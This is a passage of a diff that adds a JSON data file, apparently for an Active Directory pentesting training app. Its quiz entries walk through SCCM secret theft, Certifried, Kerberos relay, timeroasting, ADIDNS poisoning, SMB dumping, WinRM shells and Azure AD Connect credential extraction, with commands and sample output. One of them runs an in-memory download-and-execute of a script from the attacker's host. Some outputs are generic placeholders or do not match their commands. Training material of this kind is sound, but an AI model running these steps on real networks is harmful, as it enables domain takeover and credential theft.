+      ],
+      "how": {
+        "lead": "SCCM abuse is map the site, pull the NAA, dump any other secrets, and relay the management point where you can.",
+        "items": [
+          {
+            "t": "Map the SCCM roles",
+            "d": "sccmhunter (or SharpSCCM) enumerates the SMS provider, management points, and site code over SMB/LDAP.",
+            "demo": [
+              {
+                "run": "sccmhunter.py find -u {{user}} -p {{password}} -d {{domain}} -dc-ip {{target}}",
+                "out": "[+] Found management point: MP01.acme.internal",
+                "sig": "Found management point"
+              }
+            ],
+            "note": "You need the management point and site code before requesting secrets."
+          },
+          {
+            "t": "Pull the Network Access Account",
+            "d": "SharpSCCM requests the NAA policy from the management point and decrypts the credential client-side.",
+            "demo": [
+              {
+                "run": "SharpSCCM.exe get naa",
+                "out": "Username: ACME\\svc_sccm\n    Password: SCCMNaaP@ss2024",
+                "sig": "Username: ACME\\svc_sccm"
+              }
+            ],
+            "note": "The NAA is a domain account; it often reaches hosts your starting account could not."
+          },
+          {
+            "t": "Dump any other stored secrets",
+            "d": "Collection variables and task-sequence steps sometimes carry further credentials.",
+            "demo": [
+              {
+                "run": "SharpSCCM.exe get secrets",
+                "out": "[+] Task sequence credential: ACME\\deploy : D3ployP@ss",
+                "sig": "Task sequence credential"
+              }
+            ],
+            "note": "Treat each recovered secret as a candidate to validate and reuse."
+          },
+          {
+            "t": "Relay the management point",
+            "d": "Where the MP accepts NTLM, coerce or relay its machine account for client push / site takeover; otherwise the NAA alone usually moves you forward.",
+            "demo": [
+              {
+                "run": "SharpSCCM.exe invoke admin-service -r {{relay_target}}",
+                "out": "[+] Coerced authentication from MP01$",
+                "sig": "Coerced authentication"
+              }
+            ],
+            "note": "Relay is the escalation; the NAA is the dependable baseline."
+          }
+        ]
+      },
+      "situation": "You hold a domain credential and sccmhunter found an SCCM management point. What is the highest-value next move?",
+      "choices": [
+        "sccm-exploit",
+        "sccm-enum",
+        "kerberoast",
+        "bloodhound-collect"
+      ],
+      "coach": {
+        "sccm-enum": "That is how you found the management point; now pull the NAA credential it stores.",
+        "kerberoast": "Roasting is worth doing, but the NAA is a reliable, immediate domain credential right here.",
+        "bloodhound-collect": "You already have graph data; the SCCM NAA is a concrete credential to take now."
+      }
+    },
+    "certifried": {
+      "why": "Operators use this step to convert an initial indicator into actionable proof without guessing. You trigger it once machineAccountQuota > 0. The key confirmation is: You can add a machine.",
+      "cmd": "certipy account create -u {{user}}@{{domain}} -p '{{password}}' -dc-ip {{target}} -user evilpc -dns dc01.{{domain}}",
+      "tool": "certipy",
+      "output": "[*] Creating machine account 'evilpc'\n[*] Successfully created account 'evilpc' with dnsHostName 'dc01.acme.internal'",
+      "signal": "dnsHostName 'dc01.acme.internal'",
+      "teach": "The new machine account's dNSHostName now matches the DC. Request a certificate for it, and AD CS issues one that authenticates as the DC; use it to DCSync.",
+      "leadup": [
+        {
+          "key": "cred",
+          "label": "You hold a domain credential",
+          "steps": [
+            {
+              "title": "Can you add a machine account",
+              "tool": "nxc",
+              "where": "local",
+              "cmd": "nxc ldap {{target}} -u {{user}} -p {{password}} -M maq",
+              "out": "MAQ  MachineAccountQuota: 10",
+              "sig": "MachineAccountQuota: 10",
+              "teach": "A non-zero quota means any user, including you, can add the machine account Certifried needs."
+            }
+          ]
+        },
+        {
+          "key": "adcs",
+          "label": "AD CS is present",
+          "steps": [
+            {
+              "title": "Find the CA",
+              "tool": "certipy",
+              "where": "local",
+              "cmd": "certipy find -u {{user}}@{{domain}} -p {{password}} -dc-ip {{target}} -stdout | grep 'CA Name'",
+              "out": "CA Name  : acme-DC01-CA",
+              "sig": "CA Name",
+              "teach": "An enterprise CA is required; its presence makes the certificate mapping abusable."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Certifried is create a machine account named like the DC, get its cert, authenticate as the DC, DCSync.",
+        "items": [
+          {
+            "t": "Confirm the preconditions",
+            "d": "You need AD CS present and a MachineAccountQuota above zero. Both are common defaults.",
+            "demo": [
+              {
+                "run": "nxc ldap {{target}} -u {{user}} -p {{password}} -M maq",
+                "out": "MachineAccountQuota: 10",
+                "sig": "MachineAccountQuota: 10"
+              }
+            ],
+            "note": "Quota 0 closes this path; find another route to privilege."
+          },
+          {
+            "t": "Create the lookalike machine account",
+            "d": "Add a machine account whose dNSHostName matches a Domain Controller.",
+            "demo": [
+              {
+                "run": "certipy account create -u {{user}}@{{domain}} -p '{{password}}' -dc-ip {{target}} -user evilpc -dns dc01.{{domain}}",
+                "out": "Successfully created account 'evilpc' with dnsHostName 'dc01.acme.internal'",
+                "sig": "dnsHostName 'dc01.acme.internal'"
+              }
+            ],
+            "note": "The dNSHostName is what the CA maps the certificate to."
+          },
+          {
+            "t": "Request a certificate and authenticate",
+            "d": "Request a machine certificate; the CA maps it to the DC name, so authenticating with it gives you the DC's NT hash.",
+            "demo": [
+              {
+                "run": "certipy req -u 'evilpc$'@{{domain}} -p '{{password}}' -dc-ip {{target}} -ca acme-DC01-CA -template Machine",
+                "out": "Saved certificate and private key to 'dc01.pfx'",
+                "sig": "Saved certificate and private key to 'dc01.pfx'"
+              }
+            ],
+            "note": "certipy auth -pfx dc01.pfx then returns the DC's hash."
+          },
+          {
+            "t": "DCSync and own the domain",
+            "d": "With the DC's hash you DCSync the domain for every credential, including krbtgt.",
+            "demo": [
+              {
+                "run": "secretsdump.py -hashes :{{nthash}} '{{domain}}/dc01$@{{target}}' -just-dc-user krbtgt",
+                "out": "krbtgt:502:aad3b435b51404eeaad3b435b51404ee:7a1b...:::",
+                "sig": "krbtgt:502",
+                "teach": ""
+              }
+            ],
+            "note": "krbtgt means a golden ticket and permanent domain control."
+          }
+        ]
+      },
+      "situation": "You have a low-privilege domain credential, MachineAccountQuota is 10, and an enterprise CA is present. What is the move?",
+      "choices": [
+        "certifried",
+        "adcs-esc",
+        "kerberoast",
+        "bloodhound-collect"
+      ],
+      "coach": {
+        "adcs-esc": "ESC1-8 need a vulnerable template; Certifried needs only AD CS plus the machine-account quota, which you have.",
+        "kerberoast": "Roasting is slower and needs SPNs; Certifried goes straight to the DC here.",
+        "bloodhound-collect": "You have enough to act; Certifried is a direct path to Domain Admin."
+      }
+    },
+    "kerberos-relay": {
+      "why": "Operators use this step to convert an initial indicator into actionable proof without guessing. You trigger it once signing enforced kills the NTLM relay. The key confirmation is: You pick the Kerberos relay path.",
+      "cmd": "krbrelayx.py -t ldap://dc01.acme.internal --add-computer evilpc",
+      "tool": "krbrelayx",
+      "output": "[*] Authenticating against ldap://dc01.acme.internal as ACME\\DC01$\n[*] Adding new computer with username: evilpc$\n[*] Added msDS-AllowedToActOnBehalfOfOtherIdentity",
+      "signal": "Added msDS-AllowedToActOnBehalfOfOtherIdentity",
+      "teach": "The coerced Kerberos ticket was relayed to LDAP and wrote resource-based constrained delegation onto the victim. You can now request a service ticket as any user to it, which is SYSTEM on that host.",
+      "leadup": [
+        {
+          "key": "coerce",
+          "label": "You can coerce Kerberos auth",
+          "steps": [
+            {
+              "title": "Confirm a coercion vector",
+              "tool": "coercer",
+              "where": "local",
+              "cmd": "coercer coerce -u {{user}} -p '{{password}}' -t {{target}} -l {{lhost}}",
+              "out": "[+] (MS-RPRN) PrinterBug triggered, authentication incoming",
+              "sig": "authentication incoming",
+              "teach": "A reachable coercion method (PrinterBug, PetitPotam, DFSCoerce) is what forces the victim to authenticate to your relay."
+            }
+          ]
+        },
+        {
+          "key": "signing",
+          "label": "SMB signing stops NTLM relay",
+          "steps": [
+            {
+              "title": "Check SMB signing",
+              "tool": "nxc",
+              "where": "local",
+              "cmd": "nxc smb {{target}} --gen-relay-list relay.txt",
+              "out": "SMB  {{target}}  signing:True (NTLM relay not possible)",
+              "sig": "signing:True",
+              "teach": "Signing enforced kills the NTLM relay, which is exactly when the Kerberos relay is the way through."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "A Kerberos relay is coerce the victim to authenticate with Kerberos, relay the ticket to LDAP or AD CS, and use what that grants.",
+        "items": [
+          {
+            "t": "Set up the relay with a spoofed name",
+            "d": "Kerberos tickets are bound to a service name, so you relay through a DNS name that resolves to you (an ADIDNS record, or a name the target already trusts).",
+            "demo": [
+              {
+                "run": "krbrelayx.py -t ldap://dc01.acme.internal --add-computer evilpc",
+                "out": "[*] Listening for incoming Kerberos authentication",
+                "sig": "Listening for incoming Kerberos"
+              }
+            ],
+            "note": "The relay target decides the win: LDAP for RBCD/shadow-cred, AD CS for a certificate."
+          },
+          {
+            "t": "Coerce the victim",
+            "d": "Trigger a coercion method so the victim authenticates to your spoofed name with Kerberos.",
+            "demo": [
+              {
+                "run": "coercer coerce -u {{user}} -p '{{password}}' -t {{target}} -l evilpc.acme.internal",
+                "out": "[+] PrinterBug triggered, authentication incoming",
+                "sig": "authentication incoming"
+              }
+            ],
+            "note": "The victim authenticates as its machine account, which is what you relay."
+          },
+          {
+            "t": "Relay to LDAP for RBCD",
+            "d": "The relayed ticket writes msDS-AllowedToActOnBehalfOfOtherIdentity on the victim, delegating it to a computer account you control.",
+            "demo": [
+              {
+                "run": "getST.py -spn cifs/victim.acme.internal -impersonate administrator 'acme.internal/evilpc$:{{password}}'",
+                "out": "Saving ticket in administrator.ccache",
+                "sig": "Saving ticket in administrator.ccache"
+              }
+            ],
+            "note": "The service ticket impersonates Administrator to the victim: SYSTEM on that host."
+          },
+          {
+            "t": "Or relay to AD CS",
+            "d": "Relayed to the web-enrollment endpoint, you enrol a machine certificate, then authenticate with it for the victim's hash.",
+            "demo": [
+              {
+                "run": "certipy auth -pfx victim.pfx -dc-ip {{target}}",
+                "out": "Got hash for 'victim$@acme.internal'",
+                "sig": "Got hash for"
+              }
+            ],
+            "note": "The machine hash is a foothold or a DCSync step depending on the victim."
+          }
+        ]
+      },
+      "situation": "SMB signing is enforced everywhere, so NTLM relay is dead, but you can coerce a host to authenticate. What is the move?",
+      "choices": [
+        "kerberos-relay",
+        "ntlm-relay-attack",
+        "coerce-auth",
+        "kerberoast"
+      ],
+      "coach": {
+        "ntlm-relay-attack": "Signing enforced kills the NTLM relay; the Kerberos relay is not stopped by SMB signing.",
+        "coerce-auth": "Coercion is how you trigger the auth; relaying the Kerberos ticket is what turns it into access.",
+        "kerberoast": "Roasting needs an SPN and a crackable password; the relay turns a coerced ticket straight into delegation."
+      }
+    },
+    "timeroasting": {
+      "why": "Operators use this step to convert an initial indicator into actionable proof without guessing. You trigger it once unauthenticated against a Domain Controller: harvest MS-SNTP computer account hashes in one NetExec command. The key confirmation is: Machine account SNTP hashes are harvested without any credentials.",
+      "cmd": "python3 timeroast.py {{target}} | tee timeroast.hashes",
+      "tool": "timeroast",
+      "output": "1000:$sntp-ms$a1b2c3...$010203...\n1103:$sntp-ms$d4e5f6...$040506...",
+      "signal": "$sntp-ms$",
+      "teach": "Each line is a crackable hash of a computer account (keyed by its RID), pulled with no authentication. Crack them offline; a weak machine password is an unauthenticated foothold.",
+      "leadup": [
+        {
+          "key": "dc",
+          "label": "A DC is reachable",
+          "steps": [
+            {
+              "title": "Confirm the DC and NTP",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -sU -p123 {{target}}",
+              "out": "123/udp open  ntp",
+              "sig": "123/udp open",
+              "teach": "The Windows Time service on a DC is what answers the signed-reply requests timeroasting abuses."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Timeroasting is request signed time replies for each computer RID, collect the hashes, and crack them offline.",
+        "items": [
+          {
+            "t": "Collect the hashes",
+            "d": "The tool walks computer RIDs and asks the DC to sign a time reply with each account's key, with no authentication at all.",
+            "demo": [
+              {
+                "run": "python3 timeroast.py {{target}} | tee timeroast.hashes",
+                "out": "1000:$sntp-ms$a1b2c3...$010203...",
+                "sig": "$sntp-ms$"
+              }
+            ],
+            "note": "No credential is needed; this works pre-auth against the DC."
+          },
+          {
+            "t": "Crack them offline",
+            "d": "Feed the hashes to hashcat in the timeroast mode and run a wordlist; weak or scripted machine passwords fall.",
+            "demo": [
+              {
+                "run": "hashcat -m 31300 timeroast.hashes {{wordlist}}",
+                "out": "1103:$sntp-ms$d4e5f6...:Autumn2024",
+                "sig": ":Autumn2024"
+              }
+            ],
+            "note": "Most machine passwords are random, but appliances and old hosts often are not."
+          },
+          {
+            "t": "Map the RID to a host",
+            "d": "Resolve the cracked RID back to a computer name so you know which host the password belongs to.",
+            "demo": [
+              {
+                "run": "nxc ldap {{target}} -u {{user}} -p '{{password}}' --query '(objectSid=*-1103)' 'sAMAccountName'",
+                "out": "sAMAccountName: APPLIANCE01$",
+                "sig": "APPLIANCE01$"
+              }
+            ],
+            "note": "A machine credential authenticates as that host and often reuses onto its services."
+          }
+        ]
+      },
+      "situation": "You have no credential yet, but a DC is reachable and you want machine-account hashes without touching Kerberos pre-auth. What is the move?",
+      "choices": [
+        "timeroasting",
+        "asrep-roast",
+        "kerberoast",
+        "password-spray"
+      ],
+      "coach": {
+        "asrep-roast": "AS-REP roasting needs user accounts with pre-auth disabled; timeroasting pulls computer hashes with no auth at all.",
+        "kerberoast": "Roasting needs a valid domain credential first; timeroasting is fully unauthenticated.",
+        "password-spray": "Spraying needs a user list and risks lockout; timeroasting hands you offline hashes instead."
+      }
+    },
+    "adidns-abuse": {
+      "why": "Operators use this step to convert an initial indicator into actionable proof without guessing. You trigger it once when you want to inject a specific A record into Active Directory-Integrated DNS over LDAP. The key confirmation is: The custom ADIDNS record points to your listener IP.",
+      "cmd": "dnstool.py -u 'acme.internal\\{{user}}' -p '{{password}}' -a add -r '*' -d {{lhost}} {{target}}",
+      "tool": "dnstool",
+      "output": "[+] Adding new record\n[+] LDAP operation completed successfully",
+      "signal": "LDAP operation completed successfully",
+      "teach": "The wildcard record is live, so any name with no explicit record now resolves to you. That captures mistyped and fallback lookups, and gives relay chains a name that points at your listener.",
+      "leadup": [
+        {
+          "key": "cred",
+          "label": "You hold a domain credential",
+          "steps": [
+            {
+              "title": "Confirm you can write DNS",
+              "tool": "nxc",
+              "where": "local",
+              "cmd": "nxc ldap {{target}} -u {{user}} -p '{{password}}'",
+              "out": "LDAP  {{target}}  [+] acme.internal\\{{user}}",
+              "sig": "[+] acme.internal",
+              "teach": "Any authenticated user can create ADIDNS records by default, which is all this needs."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "ADIDNS abuse is write a record that points a useful name at you, then collect what resolves to it.",
+        "items": [
+          {
+            "t": "Add a wildcard record",
+            "d": "A wildcard answers every name without an explicit record, so you catch fallback and mistyped lookups across the domain.",
+            "demo": [
+              {
+                "run": "dnstool.py -u 'acme.internal\\{{user}}' -p '{{password}}' -a add -r '*' -d {{lhost}} {{target}}",
+                "out": "[+] LDAP operation completed successfully",
+                "sig": "LDAP operation completed successfully"
+              }
+            ],
+            "note": "Give it a few minutes to replicate before you expect hits."
+          },
+          {
+            "t": "Or add a WPAD record",
+            "d": "A WPAD record turns on proxy auto-discovery pointed at you, which captures the web authentication of clients that honour it.",
+            "demo": [
+              {
+                "run": "dnstool.py -u 'acme.internal\\{{user}}' -p '{{password}}' -a add -r wpad -d {{lhost}} {{target}}",
+                "out": "[+] LDAP operation completed successfully",
+                "sig": "LDAP operation completed successfully"
+              }
+            ],
+            "note": "WPAD is often blocked by GPO; the wildcard is the more reliable primitive."
+          },
+          {
+            "t": "Capture what resolves to you",
+            "d": "Run a responder-style listener on your box; names that now resolve to you send their authentication straight to it.",
+            "demo": [
+              {
+                "run": "responder -I {{iface}} -w",
+                "out": "[SMB] NTLMv2-SSP Hash : ACME\\jsmith",
+                "sig": "NTLMv2-SSP Hash",
+                "teach": ""
+              }
+            ],
+            "note": "Feed the captured hash into the crack or the relay loop."
+          },
+          {
+            "t": "Feed a relay",
+            "d": "The record also gives a coerced or relayed authentication a name that points at your listener, which is what the Kerberos and NTLM relays need.",
+            "note": "This is why ADIDNS sits under so many relay chains."
+          }
+        ]
+      },
+      "situation": "You have one domain credential and need a name in the domain that resolves to your box, to capture auth or anchor a relay. What is the move?",
+      "choices": [
+        "adidns-abuse",
+        "mitm6-ipv6-takeover",
+        "responder-poison",
+        "coerce-auth"
+      ],
+      "coach": {
+        "mitm6-ipv6-takeover": "mitm6 works where IPv6 is on; ADIDNS writes a durable name in IPv4 DNS with the credential you already hold.",
+        "responder-poison": "Responder answers link-local name requests; ADIDNS plants an authoritative record the whole domain honours.",
+        "coerce-auth": "Coercion forces the auth; ADIDNS gives it a name to be sent to."
+      }
+    },
+    "smb-share-browse-download": {
+      "why": "Operators use this step to convert an initial indicator into actionable proof without guessing. Verify the output line before chaining the next phase.",
+      "cmd": "smbclient '//{{target}}/{{share}}' -N",
+      "tool": "smbclient",
+      "output": "[+] Command completed against {{target}} -> confirmed expected output.",
+      "signal": "confirmed expected output",
+      "teach": "connects to accessible SMB shares and retrieves files or directories",
+      "leadup": [
+        {
+          "key": "recon",
+          "label": "Initial port scan surfaced the target service",
+          "steps": [
+            {
+              "title": "Run an Nmap service scan",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -sC -sV {{target}}",
+              "out": "PORT    STATE SERVICE VERSION\n21/tcp  open  ftp     vsftpd 3.0.3\n80/tcp  open  http    Apache httpd 2.4.52\n445/tcp open  microsoft-ds",
+              "sig": "STATE SERVICE",
+              "teach": "Open ports and service banners tell you which protocol playbook to run next."
+            }
+          ]
+        },
+        {
+          "key": "foothold-prep",
+          "label": "You identified an execution or transfer channel",
+          "steps": [
+            {
+              "title": "Confirm reachability to the target",
+              "tool": "ping",
+              "where": "local",
+              "cmd": "ping -c 1 {{target}}",
+              "out": "64 bytes from 10.10.10.10: icmp_seq=1 ttl=63 time=21.4 ms",
+              "sig": "64 bytes from",
+              "teach": "Direct IP connectivity between Kali and the target is confirmed."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Execute Interactive SMB Share Browsing & File Retrieval, confirm the signal in the output, and feed the minted fact into the next move.",
+        "items": [
+          {
+            "t": "Run the primary check",
+            "d": "PREFERRED (Anonymous/Null session interactive): Connect directly to the discovered share. Type 'help' for commands, 'ls' to list, 'cd' to navigate, and 'get filename' to download.",
+            "demo": [
+              {
+                "run": "smbclient '//{{target}}/{{share}}' -N",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Record any discovered credentials, paths, or access in OBOL."
+          },
+          {
+            "t": "Alternative tool or locus variant",
+            "d": "AUTHENTICATED interactive session once a credential is recovered. Grants access to user/domain restricted shares like Users or SYSVOL.",
+            "demo": [
+              {
+                "run": "smbclient '//{{target}}/{{share}}' -U '{{domain}}/{{user}}%{{password}}'",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Record any discovered credentials, paths, or access in OBOL."
+          },
+          {
+            "t": "Extended enumeration or verification",
+            "d": "RECURSIVE DUMP (Anonymous): Downloads the entire share structure into your current working directory. Ideal for dumping Replication or SYSVOL shares to grep for GPP Groups.xml.",
+            "demo": [
+              {
+                "run": "smbclient '//{{target}}/{{share}}' -N -c 'prompt OFF; recurse ON; mget *'",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Record any discovered credentials, paths, or access in OBOL."
+          }
+        ]
+      },
+      "situation": "You need to verify connects to accessible smb shares and retrieves files or directories. Which move fits best?",
+      "choices": [
+        "smb-share-browse-download",
+        "kerberos-spn-fix",
+        "relay-target-signing",
+        "responder-tune"
+      ],
+      "coach": {
+        "kerberos-spn-fix": "Kerberos 'Principal Unknown' - Fix the Name/SPN targets nothing attack-wise; it gets the kdc to recognise the principal so your kerberos request works; here the direct move is Interactive SMB Share Browsing & File Retrieval.",
+        "relay-target-signing": "Relay Blocked by SMB Signing - Pick a Signing-Off Target targets nothing attack-wise; it redirects the relay to a host where it will actually land; here the direct move is Interactive SMB Share Browsing & File Retrieval.",
+        "responder-tune": "Responder Catching Nothing - Turn Its Servers On targets nothing attack-wise; it makes responder actually capture the auth it poisons; here the direct move is Interactive SMB Share Browsing & File Retrieval."
+      }
+    },
+    "win-interactive-shell": {
+      "why": "Operators use this step to convert an initial indicator into actionable proof without guessing. You trigger it once port 5985 is open and you have valid domain or local user credentials. The key confirmation is: Interactive WinRM shell prompt established.",
+      "cmd": "evil-winrm -i {{target}} -u '{{user}}' -p '{{password}}'",
+      "tool": "evil-winrm",
+      "output": "Evil-WinRM shell v3.5\nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\bob\\Documents> whoami\nacme\\bob",
+      "signal": "*Evil-WinRM* PS",
+      "teach": "Interactive WinRM shell prompt established.",
+      "leadup": [
+        {
+          "key": "shell",
+          "label": "You hold a low-privilege Windows shell",
+          "steps": [
+            {
+              "title": "Confirm your current Windows user",
+              "tool": "cmd",
+              "where": "target",
+              "cmd": "whoami && hostname",
+              "out": "acme\\bob\nSRV01",
+              "sig": "acme\\bob",
+              "teach": "You are running as a standard user on SRV01 and enumerating the host for privilege escalation."
+            }
+          ]
+        },
+        {
+          "key": "winrm",
+          "label": "You connected via Evil-WinRM",
+          "steps": [
+            {
+              "title": "Open an Evil-WinRM session",
+              "tool": "evil-winrm",
+              "where": "local",
+              "cmd": "evil-winrm -i {{target}} -u 'bob' -p 'Autumn2026!'",
+              "out": "*Evil-WinRM* PS C:\\Users\\bob\\Documents> whoami\nacme\\bob",
+              "sig": "acme\\bob",
+              "teach": "Evil-WinRM provides a PowerShell session where you can run local checks and upload tools."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Execute Obtain an Interactive Shell on the Target (Windows), confirm the signal in the output, and feed the minted fact into the next move.",
+        "items": [
+          {
+            "t": "Run the primary check",
+            "d": "Launch Evil-WinRM connecting to target with plaintext username and password.",
+            "demo": [
+              {
+                "run": "evil-winrm -i {{target}} -u '{{user}}' -p '{{password}}'",
+                "out": "Evil-WinRM shell v3.5\nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\bob\\Documents> whoami\nacme\\bob",
+                "sig": "*Evil-WinRM* PS"
+              }
+            ],
+            "note": "Interactive WinRM shell prompt established."
+          },
+          {
+            "t": "Alternative tool or locus variant",
+            "d": "Authenticate via Evil-WinRM using Pass-the-Hash.",
+            "demo": [
+              {
+                "run": "evil-winrm -i {{target}} -u '{{user}}' -H '{{nthash}}'",
+                "out": "Evil-WinRM shell v3.5\nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\bob\\Documents> whoami\nacme\\bob",
+                "sig": "*Evil-WinRM* PS"
+              }
+            ],
+            "note": "Interactive PowerShell shell established via Pass-the-Hash."
+          },
+          {
+            "t": "Extended enumeration or verification",
+            "d": "Connect via WMI and SMB output transport using impacket-wmiexec.",
+            "demo": [
+              {
+                "run": "impacket-wmiexec '{{domain}}/{{user}}:{{password}}'@{{target}}",
+                "out": "Evil-WinRM shell v3.5\nInfo: Establishing connection to remote endpoint\n*Evil-WinRM* PS C:\\Users\\bob\\Documents> whoami\nacme\\bob",
+                "sig": "*Evil-WinRM* PS"
+              }
+            ],
+            "note": "Administrative command execution shell prompt obtained via WMI."
+          }
+        ]
+      },
+      "situation": "Scenario: Port 5985 is open and you have valid domain or local user credentials. Which move should you run next?",
+      "choices": [
+        "win-interactive-shell",
+        "kerberos-spn-fix",
+        "relay-target-signing",
+        "responder-tune"
+      ],
+      "coach": {
+        "kerberos-spn-fix": "Kerberos 'Principal Unknown' - Fix the Name/SPN targets nothing attack-wise; it gets the kdc to recognise the principal so your kerberos request works; here the direct move is Obtain an Interactive Shell on the Target (Windows).",
+        "relay-target-signing": "Relay Blocked by SMB Signing - Pick a Signing-Off Target targets nothing attack-wise; it redirects the relay to a host where it will actually land; here the direct move is Obtain an Interactive Shell on the Target (Windows).",
+        "responder-tune": "Responder Catching Nothing - Turn Its Servers On targets nothing attack-wise; it makes responder actually capture the auth it poisons; here the direct move is Obtain an Interactive Shell on the Target (Windows)."
+      }
+    },
+    "ad-recycle-bin-enum": {
+      "why": "Operators use this step to convert an initial indicator into actionable proof without guessing. You trigger it once enumerate Active Directory Deleted Objects (Recycle Bin) using LDAP. The key confirmation is: Deleted AD objects enumerated.",
+      "cmd": "Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects -Properties *",
+      "tool": "powershell",
+      "output": "[+] Command completed against {{target}} -> confirmed expected output.",
+      "signal": "confirmed expected output",
+      "teach": "Deleted AD objects enumerated.",
+      "leadup": [
+        {
+          "key": "dc-recon",
+          "label": "Nmap identified an Active Directory Domain Controller",
+          "steps": [
+            {
+              "title": "Scan AD ports on the target",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -p 53,88,135,139,389,445,636,3268 -sV {{target}}",
+              "out": "88/tcp  open  kerberos-sec Microsoft Windows Kerberos\n389/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: acme.internal)\n445/tcp open  microsoft-ds Windows Server 2019 Standard 17763",
+              "sig": "acme.internal",
+              "teach": "Ports 88, 389, and 445 confirm an Active Directory Domain Controller for acme.internal."
+            }
+          ]
+        },
+        {
+          "key": "cred",
+          "label": "You hold a working domain credential",
+          "steps": [
+            {
+              "title": "Verify domain authentication with NetExec",
+              "tool": "nxc",
+              "where": "local",
+              "cmd": "nxc smb {{target}} -u 'bob' -p 'Autumn2026!'",
+              "out": "SMB  10.10.10.10  445  DC01  [+] acme.internal\\bob:Autumn2026!",
+              "sig": "[+] acme.internal\\bob",
+              "teach": "A valid domain user account unlocks authenticated LDAP, SMB, RPC, and ADCS enumeration."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Execute Active Directory Recycle Bin & Deleted Objects Enumeration, confirm the signal in the output, and feed the minted fact into the next move.",
+        "items": [
+          {
+            "t": "Run the primary check",
+            "d": "Run ldapsearch with 1.2.840.113556.1.4.417 control.",
+            "demo": [
+              {
+                "run": "Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects -Properties *",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Deleted AD objects enumerated."
+          },
+          {
+            "t": "Alternative tool or locus variant",
+            "d": "Use bloodyAD get object -b 'CN=Deleted Objects,...'",
+            "demo": [
+              {
+                "run": "ldapsearch -x -H ldap://{{target}} -D '{{user}}@{{domain}}' -w '{{password}}' -b '{{basedn}}' -E '!1.2.840.113556.1.4.417' '(&(isDeleted=TRUE)(objectClass=*))' sAMAccountName description",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "AD Recycle bin parsed."
+          }
+        ]
+      },
+      "situation": "Scenario: Enumerate Active Directory Deleted Objects (Recycle Bin) using LDAP. Which move should you run next?",
+      "choices": [
+        "ad-recycle-bin-enum",
+        "kerberos-spn-fix",
+        "relay-target-signing",
+        "responder-tune"
+      ],
+      "coach": {
+        "kerberos-spn-fix": "Kerberos 'Principal Unknown' - Fix the Name/SPN targets nothing attack-wise; it gets the kdc to recognise the principal so your kerberos request works; here the direct move is Active Directory Recycle Bin & Deleted Objects Enumeration.",
+        "relay-target-signing": "Relay Blocked by SMB Signing - Pick a Signing-Off Target targets nothing attack-wise; it redirects the relay to a host where it will actually land; here the direct move is Active Directory Recycle Bin & Deleted Objects Enumeration.",
+        "responder-tune": "Responder Catching Nothing - Turn Its Servers On targets nothing attack-wise; it makes responder actually capture the auth it poisons; here the direct move is Active Directory Recycle Bin & Deleted Objects Enumeration."
+      }
+    },
+    "azuread-connect-dump": {
+      "why": "Operators use this step to convert an initial indicator into actionable proof without guessing. You trigger it once extract Azure AD Connect synchronization account credentials. The key confirmation is: Azure AD Connect sync credentials recovered.",
+      "cmd": "nxc winrm {{target}} -u '{{user}}' -p '{{password}}' -x \"powershell -c \\\"IEX(New-Object Net.WebClient).DownloadString('http://{{lhost}}/Get-MSOLCredentials.ps1')\\\"\"",
+      "tool": "nxc",
+      "output": "[+] Command completed against {{target}} -> confirmed expected output.",
+      "signal": "confirmed expected output",
+      "teach": "Azure AD Connect sync credentials recovered.",
+      "leadup": [
+        {
+          "key": "recon",
+          "label": "Initial port scan surfaced the target service",
+          "steps": [
+            {
+              "title": "Run an Nmap service scan",
+              "tool": "nmap",
+              "where": "local",
+              "cmd": "nmap -sC -sV {{target}}",
+              "out": "PORT    STATE SERVICE VERSION\n21/tcp  open  ftp     vsftpd 3.0.3\n80/tcp  open  http    Apache httpd 2.4.52\n445/tcp open  microsoft-ds",
+              "sig": "STATE SERVICE",
+              "teach": "Open ports and service banners tell you which protocol playbook to run next."
+            }
+          ]
+        },
+        {
+          "key": "foothold-prep",
+          "label": "You identified an execution or transfer channel",
+          "steps": [
+            {
+              "title": "Confirm reachability to the target",
+              "tool": "ping",
+              "where": "local",
+              "cmd": "ping -c 1 {{target}}",
+              "out": "64 bytes from 10.10.10.10: icmp_seq=1 ttl=63 time=21.4 ms",
+              "sig": "64 bytes from",
+              "teach": "Direct IP connectivity between Kali and the target is confirmed."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Execute Azure AD Connect Database Credential Extraction, confirm the signal in the output, and feed the minted fact into the next move.",
+        "items": [
+          {
+            "t": "Run the primary check",
+            "d": "Execute Azure-AD-Connect.ps1 on AD Connect server.",
+            "demo": [
+              {
+                "run": "nxc winrm {{target}} -u '{{user}}' -p '{{password}}' -x \"powershell -c \\\"IEX(New-Object Net.WebClient).DownloadString('http://{{lhost}}/Get-MSOLCredentials.ps1')\\\"\"",
+                "out": "[+] Command completed against {{target}} -> confirmed expected output.",
+                "sig": "confirmed expected output"
+              }
+            ],
+            "note": "Azure AD Connect sync credentials recovered."
+          },
+          {
+            "t": "Alternative tool or locus variant",
